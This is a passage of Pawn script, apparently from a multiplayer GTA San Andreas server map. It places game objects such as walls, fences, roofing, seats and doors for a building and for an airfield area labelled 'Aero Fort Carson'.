	CreateDynamicObject(19358, -285.51810, 1006.85376, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -285.51428, 1003.71802, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19404, -285.51462, 1000.57910, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -285.50851, 997.38983, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -285.49359, 994.19550, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19404, -285.48886, 991.05853, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -285.48288, 987.87775, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -285.48676, 985.03284, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, -251.08061, 1000.10632, 20.46760, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, -251.03336, 990.95831, 20.46760, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, -285.47217, 991.11115, 20.46760, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19466, -285.50281, 1000.63928, 20.46760, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -248.86078, 1008.46802, 19.31130, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -246.77179, 1008.47284, 19.31130, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -237.53453, 1008.46564, 19.31130, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -235.45256, 1006.40741, 19.31130, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, -235.45735, 1002.27747, 19.31130, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, -250.10376, 983.39771, 19.31130, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -241.83116, 983.42078, 19.31130, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(970, -235.44809, 989.80927, 19.31130, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, -235.45634, 993.95898, 19.31130, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, -235.45746, 998.12177, 19.31130, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(970, -236.90027, 986.30316, 19.31130, 0.00000, 0.00000, 45.00000);
	CreateDynamicObject(970, -238.32654, 984.86603, 19.31130, 0.00000, 0.00000, 45.00000);
	CreateDynamicObject(669, -235.77560, 983.66553, 18.38290, 356.85840, 0.00000, 3.14160);
	CreateDynamicObject(970, -245.94481, 983.40979, 19.31130, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, -236.67317, 987.08862, 19.43790, 0.00000, 0.00000, 134.74899);
	CreateDynamicObject(638, -239.11317, 984.65753, 19.43790, 0.00000, 0.00000, 134.74899);
	CreateDynamicObject(638, -242.75529, 983.91663, 19.43790, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(638, -236.00230, 990.99359, 19.43790, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, -248.13332, 983.94025, 19.43790, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(638, -238.30336, 1007.98193, 19.43790, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(638, -235.98656, 996.33899, 19.43790, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, -235.95274, 1001.63184, 19.43790, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(638, -249.56618, 1007.97101, 19.43790, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(638, -245.91197, 1007.95313, 19.43790, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(638, -235.93250, 1006.11432, 19.43790, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19362, -283.93985, 986.05194, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -283.92554, 989.44458, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -283.91855, 992.93054, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -283.90610, 996.40326, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -283.93845, 999.84186, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -283.99536, 1003.32965, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -283.98615, 1006.71594, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -283.93719, 985.11139, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -280.78043, 1006.70270, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -277.59995, 1006.69238, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -274.41943, 1006.68195, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -271.25928, 1006.69104, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -268.05856, 1006.68097, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -264.89838, 1006.69000, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -261.74466, 1006.71112, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -258.53784, 1006.68658, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -252.56969, 1006.71161, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -255.35622, 1006.69360, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -280.79343, 1003.06116, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -280.75452, 999.61597, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -280.75397, 996.14032, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -280.71695, 992.64520, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -280.72464, 989.24408, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -280.73141, 985.85522, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -280.74933, 985.11084, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -252.57358, 1003.25934, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -252.56171, 999.77716, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -252.56349, 996.31525, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -252.57182, 992.85474, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -252.57352, 989.45490, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -252.56268, 986.01550, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -252.56836, 985.15033, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -255.75285, 1003.31677, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -255.74829, 999.86462, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -258.92114, 1003.30603, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -258.91431, 999.88556, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -255.72272, 996.41650, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -255.75591, 992.92407, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -258.90067, 996.42755, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -255.78128, 985.11603, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -255.77737, 988.57489, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -255.76578, 990.04700, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -258.93549, 992.96979, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -258.88318, 989.32623, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -258.95218, 985.97162, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -258.95404, 985.11169, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -262.16437, 985.10114, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -265.38916, 985.13147, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -268.61032, 985.16748, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -271.80103, 985.17291, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -274.99170, 985.14209, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -278.02460, 985.13934, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -280.81763, 1003.64484, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -277.55463, 988.57336, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -274.53845, 992.08765, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -280.73032, 995.88055, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -277.66766, 992.00854, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -274.55743, 988.56622, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -277.60617, 995.49390, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -277.68463, 1003.20129, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -277.69034, 999.74176, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -277.72031, 996.28149, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -274.51825, 995.49225, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -271.45084, 988.59967, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -271.45486, 992.02777, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -271.45770, 995.50024, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -274.53397, 1003.25665, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -274.53525, 998.90527, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -274.52036, 1000.04578, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -271.43210, 1003.29669, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -271.49249, 998.83264, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -271.46426, 1000.27362, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -261.74335, 988.42059, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -261.70575, 991.84302, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -261.66870, 995.23755, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -261.68814, 998.63287, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -261.66376, 1002.09814, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -261.71344, 1003.18762, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -268.23975, 988.58008, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -264.90143, 988.57477, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -265.24091, 988.57690, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -258.90088, 990.55658, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -268.74500, 1003.51465, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -265.72095, 1003.53101, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -262.53809, 1003.52808, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -264.86481, 1000.12354, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -268.73709, 1000.08942, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -266.88388, 1000.08636, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -268.33539, 996.75684, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -264.28909, 996.72986, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -265.79984, 996.73181, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -268.25522, 993.24493, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -268.23767, 989.84375, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -266.73538, 994.63513, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -263.74863, 993.25647, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -266.92676, 991.39063, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19362, -264.81915, 989.86096, 22.16680, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19358, -252.71930, 983.43219, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -256.47940, 984.96552, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -256.48438, 987.90411, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, -252.57167, 989.42096, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -254.92950, 989.40942, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19366, -283.91739, 999.94379, 19.70770, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19366, -283.95953, 996.98212, 19.70770, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19366, -283.96744, 994.31580, 19.70770, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19366, -283.99191, 991.79797, 19.70770, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19366, -280.88470, 990.13611, 17.99270, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19366, -282.45740, 994.85315, 17.99270, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19366, -279.35886, 991.65918, 17.99270, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19366, -279.36493, 994.84894, 17.99270, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19366, -280.87613, 999.91699, 19.70770, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19366, -280.88580, 996.53528, 19.70770, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19366, -280.88388, 993.14465, 19.70770, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19366, -280.89462, 991.80261, 19.70770, 0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19366, -279.32257, 998.02979, 17.99270, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19366, -279.33646, 1000.05762, 17.99270, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19366, -280.91431, 1001.58893, 17.99270, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1656, -283.39615, 1001.84875, 19.68875, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -284.73517, 1001.84857, 19.68875, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -283.12939, 1001.84430, 19.68875, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -283.13971, 1002.21777, 19.44370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -284.49792, 1002.22522, 19.44370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -284.77435, 1002.19086, 19.44370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -281.72937, 1001.20984, 19.44370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -283.13791, 1002.61212, 19.19870, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -283.14429, 1002.98822, 18.95370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -284.48798, 1002.99487, 18.95370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -284.82846, 1003.00189, 18.95370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -284.46332, 1002.59711, 19.19870, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -284.80539, 1002.58417, 19.19870, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -283.13791, 1002.61212, 18.95370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -283.13971, 1002.21777, 19.19870, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -283.13971, 1002.21777, 18.95370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -283.12939, 1001.84430, 19.44370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -283.12939, 1001.84430, 19.19870, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1656, -283.12939, 1001.84430, 18.95370, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19366, -283.84201, 990.10522, 17.99270, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1491, -253.35127, 989.42786, 18.69320, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1721, -273.69971, 991.94385, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -272.28220, 991.96393, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -273.71707, 993.10712, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -273.73138, 994.26807, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -270.97226, 991.96478, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -273.77158, 995.48846, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -273.76776, 996.65118, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -273.78009, 997.75275, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -273.81870, 998.86841, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -273.83859, 1000.02148, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -272.30103, 993.07581, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -272.28699, 994.21558, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -272.25311, 995.35559, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -272.22745, 996.51477, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -272.19519, 997.66730, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -272.19302, 998.82971, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -272.17496, 999.98669, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -271.00220, 993.08521, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -271.00354, 994.24530, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -271.02777, 995.36700, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -271.01807, 996.50647, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -271.02463, 997.64685, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -271.05154, 998.80707, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1721, -271.07709, 999.94678, 18.72340, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19450, -268.33496, 988.33673, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19450, -268.33066, 997.89075, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19388, -268.33014, 1004.24438, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1491, -268.27234, 1003.49963, 18.69320, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -268.31659, 1006.81915, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -256.46906, 990.88605, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -256.47357, 993.94452, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -256.47247, 997.02820, 20.44960, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19358, -257.97769, 998.54504, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -261.19156, 998.54608, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19388, -264.35162, 998.56287, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19358, -266.78699, 998.54559, 20.44960, 0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1491, -265.15118, 998.51636, 18.69320, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, -260.55917, 987.17511, 18.68230, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, -264.52722, 987.16058, 18.68230, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, -260.55951, 991.11877, 18.68230, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, -260.55917, 987.17511, 18.68230, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19128, -264.50296, 991.11853, 18.68230, 0.00000, 0.00000, 0.00000);
	CreateDynamicObject(18654, -266.55710, 985.08850, 18.45110, 0.00000, 0.00000, 230.00000);
	CreateDynamicObject(18653, -258.57693, 985.20465, 18.45110, 0.00000, 0.00000, -410.00000);
	CreateDynamicObject(2232, -263.42017, 983.81274, 21.17610, 0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2232, -260.95102, 983.82874, 21.17610, 0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2528, -252.03331, 983.96185, 18.75880, 0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2524, -255.87097, 985.98853, 18.64900, 0.00000, 0.00000, 90.00000);
	// AERO FORT CARSON
	CreateObject(3998, 5.80, 1338.45, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, -12.07, 1414.20, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, 1.23, 1357.60, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, -16.54, 1433.23, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, -3.23, 1376.58, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, -7.88, 1358.55, -0.95,   0.00, 0.00, 104.24, 50000.0);
	CreateObject(3998, -20.60, 1392.73, -0.95,   0.00, 0.00, 104.24, 50000.0);
	CreateDynamicObject(4106, -43.75, 1392.66, 10.75,   0.00, 0.00, 194.26);
	CreateObject(3998, -7.66, 1395.44, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, 52.35, 1334.99, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, 53.27, 1330.73, -1.09,   9.00, 0.00, 193.07, 50000.0);
	CreateObject(3998, 40.13, 1386.25, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, 44.56, 1367.51, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, 35.45, 1405.95, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, 30.65, 1426.38, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, 30.32, 1428.64, -0.95,   9.00, 0.00, 13.12, 50000.0);
	CreateDynamicObject(3851, -36.09, 1369.92, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(1523, -49.22, 1422.23, 12.28,   0.00, 0.00, 284.19);
	CreateDynamicObject(1523, -48.43, 1419.39, 12.28,   0.00, 0.00, 104.39);
	CreateDynamicObject(3851, -33.76, 1426.08, 13.89,   0.00, 0.00, 284.35);
	CreateObject(3998, -26.16, 1414.90, -0.95,   0.00, 0.00, 104.24, 50000.0);
	CreateDynamicObject(3851, -46.89, 1412.98, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(3851, -38.82, 1380.81, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(3851, -41.56, 1391.78, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(3851, -44.22, 1402.31, 13.91,   0.00, 0.00, 14.06);
	CreateObject(3998, -17.83, 1381.81, -0.95,   0.00, 0.00, 104.24, 50000.0);
	CreateDynamicObject(3851, -15.85, 1369.26, 10.27,   90.00, 0.00, 284.35);
	CreateObject(3998, 15.27, 1401.08, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, 49.05, 1348.59, -0.95,   0.00, 0.00, 193.25, 50000.0);
	CreateObject(3998, 26.35, 1445.30, 1.74,   9.00, 0.00, 13.12, 50000.0);
	CreateDynamicObject(3851, -47.15, 1414.06, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(3851, -15.30, 1375.23, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(1523, -19.55, 1391.98, 12.28,   0.00, 0.00, 284.16);
	CreateDynamicObject(3851, -26.93, 1421.99, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(1523, -25.67, 1416.61, 12.28,   0.00, 0.00, 284.16);
	CreateDynamicObject(3851, -23.91, 1409.72, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(1523, -22.64, 1404.35, 12.28,   0.00, 0.00, 284.16);
	CreateDynamicObject(3851, -20.86, 1397.41, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(3851, -17.77, 1385.07, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(3851, -43.68, 1423.57, 13.91,   0.00, 0.00, 284.35);
	CreateDynamicObject(1523, -20.98, 1368.03, 12.28,   0.00, 0.00, 193.88);
	CreateDynamicObject(1523, -23.83, 1367.24, 12.28,   0.00, 0.00, 14.62);
	CreateDynamicObject(3851, -29.24, 1365.86, 13.91,   0.00, 0.00, 284.35);
	CreateDynamicObject(3851, -19.17, 1368.43, 10.27,   90.00, 0.00, 284.35);
	CreateDynamicObject(3851, -15.51, 1376.09, 13.91,   0.00, 0.00, 14.06);
	CreateDynamicObject(2797, -48.82, 1420.88, 15.36,   0.00, 0.00, 284.34);
	CreateDynamicObject(2792, -19.32, 1390.82, 15.14,   0.00, 0.00, 283.68);
	CreateDynamicObject(2793, -22.24, 1403.12, 15.09,   0.00, 0.00, 284.16);
	CreateDynamicObject(2794, -25.42, 1415.58, 15.13,   0.00, 0.00, 281.88);
	CreateDynamicObject(3095, -37.92, 1411.26, 15.79,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -31.53, 1421.98, 11.75,   0.00, 0.00, 13.89);
	CreateDynamicObject(3095, -39.16, 1420.04, 11.75,   0.00, 0.00, 13.89);
	CreateDynamicObject(16151, -41.17, 1394.75, 12.61,   0.00, 0.00, 195.08);
	CreateDynamicObject(16151, -42.76, 1401.41, 12.61,   0.00, 0.00, 195.08);
	CreateDynamicObject(2027, -25.16, 1378.72, 12.85,   0.00, 0.00, 284.00);
	CreateDynamicObject(2027, -36.28, 1375.99, 12.85,   0.00, 0.00, 284.00);
	CreateDynamicObject(2027, -34.71, 1376.35, 12.85,   0.00, 0.00, 284.00);
	CreateDynamicObject(2027, -31.69, 1377.07, 12.85,   0.00, 0.00, 284.00);
	CreateDynamicObject(2027, -30.13, 1377.44, 12.85,   0.00, 0.00, 284.00);
	CreateDynamicObject(2027, -26.73, 1378.33, 12.85,   0.00, 0.00, 284.00);
	CreateDynamicObject(3657, -27.94, 1390.24, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -26.97, 1405.89, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -28.34, 1411.86, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -29.81, 1411.52, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -28.42, 1405.46, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -31.48, 1404.76, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -32.85, 1410.75, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -34.40, 1410.40, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -33.04, 1404.44, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -36.00, 1403.76, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -37.38, 1409.81, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -24.54, 1396.15, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -25.38, 1372.32, 12.69,   0.00, 0.00, 13.62);
	CreateDynamicObject(3657, -24.83, 1391.02, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -25.90, 1395.68, 12.69,   0.00, 0.00, 104.55);
	CreateDynamicObject(3657, -29.02, 1394.97, 12.69,   0.00, 0.00, 104.55);
